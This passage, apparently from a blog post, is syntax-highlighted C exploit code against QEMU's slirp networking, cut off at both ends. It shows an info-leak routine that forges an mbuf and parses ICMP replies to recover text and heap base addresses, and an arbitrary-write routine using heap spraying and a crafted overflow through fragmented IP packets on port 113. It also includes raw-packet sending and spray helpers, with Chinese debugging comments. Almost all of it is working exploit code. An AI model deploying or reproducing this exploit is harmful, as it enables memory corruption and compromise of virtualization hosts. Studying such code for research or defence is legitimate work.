class="number">0x300</span> + <span class="number">4</span>); <span class="comment">// 这个packet就在so_rcv的后面</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        let's overflow here!</span></span><br><span class="line"><span class="comment">        send(xxx)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">        write(s, payload, <span class="number">0x500</span>); <span class="comment">// 不能send一个满的m_buf，因为会有一个off by</span></span><br><span class="line">                                  <span class="comment">// null = =。。。。</span></span><br><span class="line">        usleep(<span class="number">60000</span>); <span class="comment">// 不知道为啥，貌似内核会合并包？</span></span><br><span class="line">                       <span class="comment">// 如果合并了就会off by null...</span></span><br><span class="line">                       <span class="comment">// 所以sleep一下</span></span><br><span class="line">        dbg_printf(<span class="string">"send %d complete\n"</span>, i + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    write(s, payload, <span class="number">1072</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// actual overflow here</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;</span><br><span class="line">    *payload64++ = <span class="number">0x675</span>; <span class="comment">// chunk header</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_next</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_prev</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_nextpkt</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_prevpkt</span></span><br><span class="line">    payload32 = (<span class="keyword">uint32_t</span> *)payload64;</span><br><span class="line">    *payload32++ = <span class="number">0</span>;     <span class="comment">// m_flags</span></span><br><span class="line">    *payload32++ = <span class="number">0x608</span>; <span class="comment">// m_size</span></span><br><span class="line">    payload64 = (<span class="keyword">uint64_t</span> *)payload32;</span><br><span class="line">    *payload64++ = <span class="number">0</span>; <span class="comment">// m_so</span></span><br><span class="line">    payload = (<span class="keyword">uint8_t</span> *)payload64;</span><br><span class="line">    assert(addr_len &lt;= <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; addr_len; ++i) &#123;</span><br><span class="line">        *payload++ = (addr &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xff</span>; <span class="comment">// m_data</span></span><br><span class="line">    &#125;</span><br><span class="line">    write(s, payload_start, (<span class="keyword">uint8_t</span> *)payload - payload_start);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]leaking: Now we have finished faking m_data.\n"</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line">    <span class="comment">// write(s, payload, 0x1000);</span></span><br><span class="line">    dbg_printf(<span class="string">"trigger reass!"</span>);</span><br><span class="line">    <span class="comment">// getchar();</span></span><br><span class="line">    <span class="built_in">memset</span>(payload, <span class="string">'A'</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(payload, <span class="string">"ama2in9"</span>, <span class="number">7</span>);</span><br><span class="line">    pkt_info.ip_id = <span class="number">0xdead</span>;</span><br><span class="line">    pkt_info.ip_off = <span class="number">0x300</span> + <span class="number">24</span>;</span><br><span class="line">    pkt_info.MF = <span class="number">0</span>;</span><br><span class="line">    pkt_info.ip_p = IPPROTO_ICMP;</span><br><span class="line"></span><br><span class="line">    recvsd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));</span><br><span class="line">    send_ip_pkt(&amp;pkt_info, payload, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]leaking: Now we have finished writting to target.\nAlso, this means we will get the response packet we want.\n"</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// we receive data here</span></span><br><span class="line">    <span class="keyword">int</span> bytes, status;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> *<span class="title">recv_iphdr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">icmp</span> *<span class="title">recv_icmphdr</span>;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> recv_ether_frame[IP_MAXPACKET];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">from</span>;</span></span><br><span class="line">    <span class="keyword">socklen_t</span> fromlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">wait</span>, <span class="title">t1</span>, <span class="title">t2</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timezone</span> <span class="title">tz</span>;</span></span><br><span class="line">    <span class="keyword">double</span> dt;</span><br><span class="line"></span><br><span class="line">    (<span class="keyword">void</span>)gettimeofday(&amp;t1, &amp;tz);</span><br><span class="line">    wait.tv_sec = <span class="number">2</span>;</span><br><span class="line">    wait.tv_usec = <span class="number">0</span>;</span><br><span class="line">    setsockopt(recvsd, SOL_SOCKET, SO_RCVTIMEO, (<span class="keyword">char</span> *)&amp;wait,</span><br><span class="line">               <span class="keyword">sizeof</span>(struct timeval));</span><br><span class="line">    recv_iphdr = (struct ip *)(recv_ether_frame + ETH_HDRLEN);</span><br><span class="line">    recv_icmphdr = (struct icmp *)(recv_ether_frame + ETH_HDRLEN + IP4_HDRLEN);</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(recv_ether_frame, <span class="number">0</span>, IP_MAXPACKET * <span class="keyword">sizeof</span>(<span class="keyword">uint8_t</span>));</span><br><span class="line">        <span class="built_in">memset</span>(&amp;from, <span class="number">0</span>, <span class="keyword">sizeof</span>(from));</span><br><span class="line">        fromlen = <span class="keyword">sizeof</span>(from);</span><br><span class="line">        <span class="keyword">if</span> ((bytes = recvfrom(recvsd, recv_ether_frame, IP_MAXPACKET, <span class="number">0</span>,</span><br><span class="line">                              (struct sockaddr *)&amp;from, &amp;fromlen)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            status = errno;</span><br><span class="line">            <span class="keyword">if</span> (status == EAGAIN) &#123; <span class="comment">// EAGAIN = 11</span></span><br><span class="line">                dbg_printf(<span class="string">"No reply within %li seconds.\n"</span>, wait.tv_sec);</span><br><span class="line">                <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (status == EINTR) &#123; <span class="comment">// EINTR = 4</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                perror(<span class="string">"recvfrom() failed "</span>);</span><br><span class="line">                <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="comment">// End of error handling conditionals.</span></span><br><span class="line">        <span class="comment">// hexdump("recv", recv_ether_frame, 0x50);</span></span><br><span class="line">        dbg_printf(<span class="string">"recv count %d\n"</span>, count++);</span><br><span class="line">        <span class="keyword">if</span> ((((recv_ether_frame[<span class="number">12</span>] &lt;&lt; <span class="number">8</span>) + recv_ether_frame[<span class="number">13</span>]) ==</span><br><span class="line">             ETH_P_IP) &amp;&amp;</span><br><span class="line">            (recv_iphdr-&gt;ip_p == IPPROTO_ICMP) &amp;&amp;</span><br><span class="line">            (recv_icmphdr-&gt;icmp_type == ICMP_ECHOREPLY)) &#123;</span><br><span class="line">            <span class="comment">// Stop timer and calculate how long it took to get a reply.</span></span><br><span class="line">            (<span class="keyword">void</span>)gettimeofday(&amp;t2, &amp;tz);</span><br><span class="line">            dt = (<span class="keyword">double</span>)(t2.tv_sec - t1.tv_sec) * <span class="number">1000.0</span> +</span><br><span class="line">                 (<span class="keyword">double</span>)(t2.tv_usec - t1.tv_usec) / <span class="number">1000.0</span>;</span><br><span class="line">            <span class="comment">// 底下这个可能会segfault</span></span><br><span class="line">            <span class="comment">// if (inet_ntop(AF_INET, &amp;(recv_iphdr-&gt;ip_src.s_addr), rec_ip,</span></span><br><span class="line">            <span class="comment">// INET_ADDRSTRLEN) == NULL) &#123;</span></span><br><span class="line">            <span class="comment">//     status = errno;</span></span><br><span class="line">            <span class="comment">//     fprintf(stderr, "inet_ntop() failed.\nError message: %s",</span></span><br><span class="line">            <span class="comment">//     strerror(status)); exit(EXIT_FAILURE);</span></span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line">            dbg_printf(<span class="string">"%g ms (%i bytes received)\n"</span>, dt, bytes);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">            hexdump(<span class="string">"ping recv"</span>, recv_ether_frame, bytes);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            <span class="keyword">if</span> (bytes &lt; <span class="number">0x200</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            text_base =</span><br><span class="line">                ((*(<span class="keyword">uint64_t</span> *)(recv_ether_frame + <span class="number">0x88</span>)) - <span class="number">0x7e7d01</span>) &amp; ~<span class="number">0xfff</span>;</span><br><span class="line">            heap_base = (*(<span class="keyword">uint64_t</span> *)(recv_ether_frame + <span class="number">0x90</span>)) &amp; ~<span class="number">0xffffff</span>;</span><br><span class="line">            dbg_printf(<span class="string">"leak text_base: 0x%lx\n"</span></span><br><span class="line">                       <span class="string">"leak heap_base: 0x%lx\n"</span>,</span><br><span class="line">                       text_base, heap_base);</span><br><span class="line">            <span class="comment">// getchar();</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="comment">// End if IP ethernet frame carrying ICMP_ECHOREPLY</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line">    close(s);</span><br><span class="line">    close(recvsd);</span><br><span class="line">    <span class="built_in">free</span>(payload_start);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">arbitrary_write</span><span class="params">(<span class="keyword">uint64_t</span> addr, <span class="keyword">int</span> addr_len, <span class="keyword">uint8_t</span> *write_data,</span></span></span><br><span class="line"><span class="function"><span class="params">                    <span class="keyword">int</span> write_data_len, <span class="keyword">int</span> spray_times)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s, len, i;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">ip_addr</span>;</span></span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip_pkt_info</span> <span class="title">pkt_info</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> *payload = (<span class="keyword">uint8_t</span> *)<span class="built_in">malloc</span>(IP_MAXPACKET);</span><br><span class="line">    <span class="keyword">uint8_t</span> *payload_start = payload;</span><br><span class="line">    <span class="keyword">uint32_t</span> *payload32 = (<span class="keyword">uint32_t</span> *)payload;</span><br><span class="line">    <span class="keyword">uint64_t</span> *payload64 = (<span class="keyword">uint64_t</span> *)payload;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(payload, <span class="string">'A'</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(payload, <span class="string">"xmzyshypnc"</span>, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; spray_times; ++i) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"spraying size 0x2000, id: %d\n"</span>, i);</span><br><span class="line">        spray(<span class="number">0x2000</span>, g_spray_ip_id + i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]Now we spray to malloc all freed buf.\n"</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line">    dbg_printf(<span class="string">"spray finished.\n"</span>);</span><br><span class="line"></span><br><span class="line">    s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    ip_addr.sin_family = AF_INET;</span><br><span class="line">    ip_addr.sin_addr.s_addr = inet_addr(host);</span><br><span class="line">    ip_addr.sin_port = htons(<span class="number">113</span>); <span class="comment">// vulnerable port</span></span><br><span class="line">    len = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">    ret = connect(s, (struct sockaddr *)&amp;ip_addr, len);</span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">"oops: client"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    pkt_info.ip_id = <span class="number">0xdead</span>;</span><br><span class="line">    pkt_info.ip_off = <span class="number">0</span>;</span><br><span class="line">    pkt_info.MF = <span class="number">1</span>;</span><br><span class="line">    pkt_info.ip_p = <span class="number">0xff</span>;</span><br><span class="line">    send_ip_pkt(&amp;pkt_info, payload, <span class="number">0x300</span> + <span class="number">4</span>); <span class="comment">// 这个packet就在so_rcv的后面</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]Now we finished the malloc of so_rcv and the mbuf.\n"</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        let's overflow here!</span></span><br><span class="line"><span class="comment">        send(xxx)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">        write(s, payload, <span class="number">0x500</span>); <span class="comment">// 不能send一个满的m_buf，因为会有一个off by</span></span><br><span class="line">                                  <span class="comment">// null = =。。。。</span></span><br><span class="line">        usleep(<span class="number">20000</span>); <span class="comment">// 不知道为，貌似内核会合并包？</span></span><br><span class="line">                       <span class="comment">// 如果合并了就会off by null...</span></span><br><span class="line">                       <span class="comment">// 所以sleep一下</span></span><br><span class="line">        dbg_printf(<span class="string">"send %d complete\n"</span>, i + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    write(s, payload, <span class="number">1072</span>);</span><br><span class="line">    <span class="comment">// actual overflow here</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;</span><br><span class="line">    *payload64++ = <span class="number">0x675</span>; <span class="comment">// chunk header</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_next</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_prev</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_nextpkt</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_prevpkt</span></span><br><span class="line">    payload32 = (<span class="keyword">uint32_t</span> *)payload64;</span><br><span class="line">    *payload32++ = <span class="number">0</span>;     <span class="comment">// m_flags</span></span><br><span class="line">    *payload32++ = <span class="number">0x608</span>; <span class="comment">// m_size</span></span><br><span class="line">    payload64 = (<span class="keyword">uint64_t</span> *)payload32;</span><br><span class="line">    *payload64++ = <span class="number">0</span>; <span class="comment">// m_so</span></span><br><span class="line">    payload = (<span class="keyword">uint8_t</span> *)payload64;</span><br><span class="line">    assert(addr_len &lt;= <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; addr_len; ++i) &#123;</span><br><span class="line">        *payload++ = (addr &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xff</span>; <span class="comment">// m_data</span></span><br><span class="line">    &#125;</span><br><span class="line">    write(s, payload_start, (<span class="keyword">uint8_t</span> *)payload - payload_start);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]Now we have written faked mbuf struct"</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line">    <span class="comment">// write(s, payload, 0x1000);</span></span><br><span class="line">    <span class="keyword">if</span> (stop_flag) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"trigger!"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    pkt_info.ip_id = <span class="number">0xdead</span>;</span><br><span class="line">    pkt_info.ip_off = <span class="number">0x300</span> + <span class="number">24</span>;</span><br><span class="line">    pkt_info.MF = <span class="number">0</span>;</span><br><span class="line">    pkt_info.ip_p = <span class="number">0xff</span>;</span><br><span class="line">    send_ip_pkt(&amp;pkt_info, write_data, write_data_len);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]Now we have trigger the written to target addr.\n"</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line"></span><br><span class="line">    close(s);</span><br><span class="line">    <span class="built_in">free</span>(payload_start);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 真正malloc的大小是payloadlen + 64</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_ip_pkt</span><span class="params">(struct ip_pkt_info *pkt_info, <span class="keyword">uint8_t</span> *payload,</span></span></span><br><span class="line"><span class="function"><span class="params">                 <span class="keyword">int</span> payloadlen)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> status, sd, *ip_flags, *tcp_flags;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> on = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">char</span> *interface, *src_ip, *dst_ip;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> <span class="title">iphdr</span>;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> *packet;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ifreq</span> <span class="title">ifr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocate memory for various arrays.</span></span><br><span class="line">    packet = allocate_ustrmem(IP_MAXPACKET);</span><br><span class="line">    interface = allocate_strmem(<span class="number">40</span>);</span><br><span class="line">    src_ip = allocate_strmem(INET_ADDRSTRLEN);</span><br><span class="line">    dst_ip = allocate_strmem(INET_ADDRSTRLEN);</span><br><span class="line">    ip_flags = allocate_intmem(<span class="number">4</span>);</span><br><span class="line">    tcp_flags = allocate_intmem(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Interface to send packet through.</span></span><br><span class="line">    <span class="built_in">strcpy</span>(interface, g_interface);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Submit request for a socket descriptor to look up interface.</span></span><br><span class="line">    <span class="keyword">if</span> ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"socket() failed to get socket descriptor for using ioctl() "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Use ioctl() to look up interface index which we will use to</span></span><br><span class="line">    <span class="comment">// bind socket descriptor sd to specified interface with setsockopt() since</span></span><br><span class="line">    <span class="comment">// none of the other arguments of sendto() specify which interface to use.</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;ifr, <span class="number">0</span>, <span class="keyword">sizeof</span>(ifr));</span><br><span class="line">    <span class="built_in">snprintf</span>(ifr.ifr_name, <span class="keyword">sizeof</span>(ifr.ifr_name), <span class="string">"%s"</span>, interface);</span><br><span class="line">    <span class="keyword">if</span> (ioctl(sd, SIOCGIFINDEX, &amp;ifr) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"ioctl() failed to find interface "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    close(sd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Source IPv4 address: you need to fill this out</span></span><br><span class="line">    <span class="built_in">strcpy</span>(src_ip, <span class="string">"127.0.0.1"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(dst_ip, <span class="string">"127.0.0.1"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// IPv4 header</span></span><br><span class="line">    <span class="comment">// IPv4 header length (4 bits): Number of 32-bit words in header = 5</span></span><br><span class="line">    iphdr.ip_hl = IP4_HDRLEN / <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>);</span><br><span class="line">    <span class="comment">// Internet Protocol version (4 bits): IPv4</span></span><br><span class="line">    iphdr.ip_v = <span class="number">4</span>;</span><br><span class="line">    <span class="comment">// Type of service (8 bits)</span></span><br><span class="line">    iphdr.ip_tos = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Total length of datagram (16 bits): IP header + TCP header + TCP data</span></span><br><span class="line">    iphdr.ip_len = htons(IP4_HDRLEN + payloadlen);</span><br><span class="line">    <span class="comment">// ID sequence number (16 bits): unused, since single datagram</span></span><br><span class="line">    iphdr.ip_id = htons(pkt_info-&gt;ip_id);</span><br><span class="line">    <span class="comment">// Flags, and Fragmentation offset (3, 13 bits): 0 since single datagram</span></span><br><span class="line">    <span class="comment">// Zero (1 bit)</span></span><br><span class="line">    ip_flags[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Do not fragment flag (1 bit)</span></span><br><span class="line">    ip_flags[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// More fragments following flag (1 bit)</span></span><br><span class="line">    ip_flags[<span class="number">2</span>] = pkt_info-&gt;MF;</span><br><span class="line">    <span class="comment">// Fragmentation offset (13 bits)</span></span><br><span class="line">    ip_flags[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    iphdr.ip_off =</span><br><span class="line">        htons((ip_flags[<span class="number">0</span>] &lt;&lt; <span class="number">15</span>) + (ip_flags[<span class="number">1</span>] &lt;&lt; <span class="number">14</span>) + (ip_flags[<span class="number">2</span>] &lt;&lt; <span class="number">13</span>) +</span><br><span class="line">              ip_flags[<span class="number">3</span>] + (pkt_info-&gt;ip_off &gt;&gt; <span class="number">3</span>));</span><br><span class="line">    <span class="comment">// Time-to-Live (8 bits): default to maximum value</span></span><br><span class="line">    iphdr.ip_ttl = <span class="number">255</span>;</span><br><span class="line">    <span class="comment">// Transport layer protocol (8 bits): 6 for TCP</span></span><br><span class="line">    iphdr.ip_p = pkt_info-&gt;ip_p;</span><br><span class="line">    <span class="comment">// iphdr.ip_p = IPPROTO_TCP;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Source IPv4 address (32 bits)</span></span><br><span class="line">    <span class="keyword">if</span> ((status = inet_pton(AF_INET, src_ip, &amp;(iphdr.ip_src))) != <span class="number">1</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"inet_pton() failed.\nError message: %s"</span>, strerror(status));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Destination IPv4 address (32 bits)</span></span><br><span class="line">    <span class="keyword">if</span> ((status = inet_pton(AF_INET, dst_ip, &amp;(iphdr.ip_dst))) != <span class="number">1</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"inet_pton() failed.\nError message: %s"</span>, strerror(status));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// IPv4 header checksum (16 bits): set to 0 when calculating checksum</span></span><br><span class="line">    iphdr.ip_sum = <span class="number">0</span>;</span><br><span class="line">    iphdr.ip_sum = checksum((<span class="keyword">uint16_t</span> *)&amp;iphdr, IP4_HDRLEN);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prepare packet.</span></span><br><span class="line">    <span class="comment">// First part is an IPv4 header.</span></span><br><span class="line">    <span class="built_in">memcpy</span>(packet, &amp;iphdr, IP4_HDRLEN * <span class="keyword">sizeof</span>(<span class="keyword">uint8_t</span>));</span><br><span class="line">    <span class="comment">// Last part is upper layer protocol data.</span></span><br><span class="line">    <span class="built_in">memcpy</span>((packet + IP4_HDRLEN), payload, payloadlen * <span class="keyword">sizeof</span>(<span class="keyword">uint8_t</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The kernel is going to prepare layer 2 information (ethernet frame</span></span><br><span class="line">    <span class="comment">// header) for us. For that, we need to specify a destination for the kernel</span></span><br><span class="line">    <span class="comment">// in order for it to decide where to send the raw datagram. We fill in a</span></span><br><span class="line">    <span class="comment">// struct in_addr with the desired destination IP address, and pass this</span></span><br><span class="line">    <span class="comment">// structure to the sendto() function.</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;<span class="built_in">sin</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line">    <span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line">    <span class="built_in">sin</span>.sin_addr.s_addr = iphdr.ip_dst.s_addr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Submit request for a raw socket descriptor.</span></span><br><span class="line">    <span class="keyword">if</span> ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"socket() failed "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set flag so socket expects us to provide IPv4 header.</span></span><br><span class="line">    <span class="keyword">if</span> (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &amp;on, <span class="keyword">sizeof</span>(on)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"setsockopt() failed to set IP_HDRINCL "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Bind socket to interface index.</span></span><br><span class="line">    <span class="keyword">if</span> (setsockopt(sd, SOL_SOCKET, SO_BINDTODEVICE, &amp;ifr, <span class="keyword">sizeof</span>(ifr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"setsockopt() failed to bind to interface "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Send packet.</span></span><br><span class="line">    <span class="keyword">if</span> (sendto(sd, packet, IP4_HDRLEN + TCP_HDRLEN + payloadlen, <span class="number">0</span>,</span><br><span class="line">               (struct sockaddr *)&amp;<span class="built_in">sin</span>, <span class="keyword">sizeof</span>(struct sockaddr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"sendto() failed "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Close socket descriptor.</span></span><br><span class="line">    close(sd);</span><br><span class="line">    <span class="comment">// Free allocated memory.</span></span><br><span class="line">    <span class="built_in">free</span>(packet);</span><br><span class="line">    <span class="built_in">free</span>(interface);</span><br><span class="line">    <span class="built_in">free</span>(src_ip);</span><br><span class="line">    <span class="built_in">free</span>(dst_ip);</span><br><span class="line">    <span class="built_in">free</span>(ip_flags);</span><br><span class="line">    <span class="built_in">free</span>(tcp_flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spray</span><span class="params">(<span class="keyword">int</span> size, <span class="keyword">uint16_t</span> ip_id)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, status, sd, *ip_flags, *tcp_flags;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> on = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">char</span> *interface, *src_ip, *dst_ip;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> <span class="title">iphdr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> <span class="title">tcphdr</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *payload;</span><br><span class="line">    <span class="keyword">int</span> payloadlen;</span><br><span class="line">    <span class="keyword">uint8_t</span> *packet;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ifreq</span> <span class="title">ifr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocate memory for various arrays.</span></span><br><span class="line">    packet = allocate_ustrmem(IP_MAXPACKET);</span><br><span class="line">    interface = allocate_strmem(<span class="number">40</span>);</span><br><span class="line">    src_ip = allocate_strmem(INET_ADDRSTRLEN);</span><br><span class="line">    dst_ip = allocate_strmem(INET_ADDRSTRLEN);</span><br><span class="line">    ip_flags = allocate_intmem(<span class="number">4</span>);</span><br><span class="line">    tcp_flags = allocate_intmem(<span class="number">8</span>);</span><br><span class="line">    payload = allocate_strmem(IP_MAXPACKET);</span><br><span class="line"></span><br><span class="line">    payloadlen = size - <span class="number">84</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Interface to send packet through.</span></span><br><span class="line">    <span class="built_in">strcpy</span>(interface, g_interface);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 